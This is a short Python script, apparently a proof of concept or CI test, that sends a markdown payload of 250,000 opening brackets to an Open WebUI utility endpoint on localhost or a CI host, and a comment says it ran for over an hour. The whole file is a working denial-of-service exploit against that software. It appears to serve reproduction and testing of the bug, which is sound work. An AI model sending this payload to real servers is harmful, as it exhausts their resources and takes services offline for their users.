import requests
import json
import sys

IS_CI_RUN = sys.argv[0]
HOSTNAME='localhost'

if IS_CI_RUN == "true":
    HOSTNAME='open-webui'

print(f"Sending exploit to {HOSTNAME}")
# Can be quite large. This ran for at least an hour (and counting)
payload = "[" * 250000
rep = requests.post(f"http://{HOSTNAME}:8080/api/v1/utils/markdown", json={
    "md": payload
})